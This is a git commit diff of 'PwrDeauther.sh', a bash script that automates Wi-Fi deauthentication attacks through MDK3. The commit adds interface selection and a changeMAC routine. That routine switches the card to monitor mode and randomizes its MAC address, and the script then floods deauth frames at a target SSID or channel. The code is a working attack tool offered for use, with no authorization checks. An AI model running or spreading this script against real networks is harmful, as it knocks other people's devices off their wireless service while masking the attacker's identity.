3b35287719921c9976c8cf945dfe7d2bc9b0f372
BlueArduino20 <bluearduino20@gmail.com>
2018-10-18 16:42:15 +0200

    New interface & "coolexit" improved
    -New interface (ifcard selection)
    -Fuction "coolexit" improved
    +

--- PwrDeauther.sh
+++ PwrDeauther.sh
@@ -24,28 +24,45 @@ BOLD_GRAY="\e[1;30m"
 
 function coolexit()
 {
-clear
-sleep 2
-ifconfig $AD down
-macchanger -p $AD
-iwconfig $AD mode managed
-ifconfig $AD up
-clear
-echo -e $BOLD_RED
-echo "Thanks for using this script"
-echo "Made by BlueArduino20"
-exit
+	clear
+	sleep 2
+	ifconfig $WI down
+	macchanger -p $WI
+	iwconfig $WI mode managed
+	ifconfig $WI up
+	clear
+	title
+	echo -e $BOLD_RED
+	echo " Thanks for using this script"
+	echo -e " My GitHub:$BOLD_WHITE https://github.com/BlueArduino"
+	exit
 }
 
 function title() {
 	echo -e $BOLD_GREEN
-	echo "    ____	  	____	               __  __	     "
-	echo "   / __ \\_      _______/ __ \\___  ____ ___  __/ /_/ /_  ___  _____"
-	echo "  / /_/ / | /| / / ___/ / / / _ \\/ __ \`/ / / / __/ __ \\/ _ \\/ ___/"
-	echo " / ____/| |/ |/ / /  / /_/ /  __/ /_/ / /_/ / /_/ / / /  __/ /    "
-	echo "/_/     |__/|__/_/  /_____/\\___/\\__,_/\\__,_/\\__/_/ /_/\\___/_/     "
+	echo "     ____                ____	                __  __	     "
+	echo "    / __ \\_      _______/ __ \\___  ____ ___  __/ /_/ /_  ___  _____"
+	echo "   / /_/ / | /| / / ___/ / / / _ \\/ __ \`/ / / / __/ __ \\/ _ \\/ ___/"
+	echo "  / ____/| |/ |/ / /  / /_/ /  __/ /_/ / /_/ / /_/ / / /  __/ /    "
+	echo " /_/     |__/|__/_/  /_____/\\___/\\__,_/\\__,_/\\__/_/ /_/\\___/_/     "
 	echo -e $BOLD_WHITE
-	echo "         		 Automatic MDK3 deauther by BlueArduino20"
+	echo "            		 Automatic MDK3 deauther by BlueArduino20"
+}
+
+function getIFCARD() {
+        echo -e "$BOLD_GREEN   Your interfaces: "
+        echo -e -n "$BOLD_WHITE"
+        ifconfig | grep -e ": " | sed -e 's/: .*//g' | sed -e 's/^/   /'
+        echo " "
+        echo -n -e "$BOLD_BLUE   Type your wireless interface > "
+        echo -n -e "$BOLD_WHITE"
+}
+
+function changeMAC() {
+        ifconfig $WI down
+        iwconfig $WI mode monitor
+        macchanger -r $WI
+        ifconfig $WI up
 }
 
 title
@@ -64,40 +81,42 @@ if [ $CHOICE == 1 ]; then
 	echo -e $NO_COLOR
 	nmcli dev wifi
 	echo " "
+	echo -e -n $BOLD_BLUE
+	echo -n " Type the target SSID > "
 	echo -e -n $BOLD_WHITE
-	echo -n "Type the target SSID > "
 	read SSID
 	clear
-	ifconfig
-	echo -e -n "$BOLD_CYAN Type your wireless interface > "
+	title
+	echo " "
+	getIFCARD
 	read WI
+	clear
+	title
 	echo -e $BOLD_GREEN
-	echo "\e[1;31mStarting the attack... If you want to stop it press CTRL+C"
-	ifconfig $WI down
-	iwconfig $WI mode monitor
-	macchanger -r $WI
-	ifconfig $WI up
+	echo "Starting the attack... If you want to stop it press CTRL+C"
+	changeMAC
 	trap coolexit EXIT
-	mdk3 $WI d -n $SSID
+	mdk3 $WI d -n "$SSID"
 fi
 if [ $CHOICE == 2 ]; then
 	title
 	echo -e $NO_COLOR
 	nmcli dev wifi
 	echo " "
+	echo -e -n $BOLD_BLUE
+	echo -n " Type the target channel > "
 	echo -e -n $BOLD_WHITE
-	echo -n "Type the target channel > "
 	read CH
 	clear
-	ifconfig
-	echo -e -n "$BOLD_CYAN Type your wireless interface > "
+	title
+	echo " "
+	getIFCARD
 	read WI
+	clear
+	title
  	echo -e $BOLD_GREEN
-	echo -e "Starting the attack... If you want to stop it press CTRL+C."
-	ifconfig $WI down
-	iwconfig $WI mode monitor
-	macchanger -r $WI
-	ifconfig $WI up
+	echo -e " Starting the attack... If you want to stop it press CTRL+C."
+	changeMAC
 	trap coolexit EXIT
 	mdk3 $WI d -c $CH
 fi
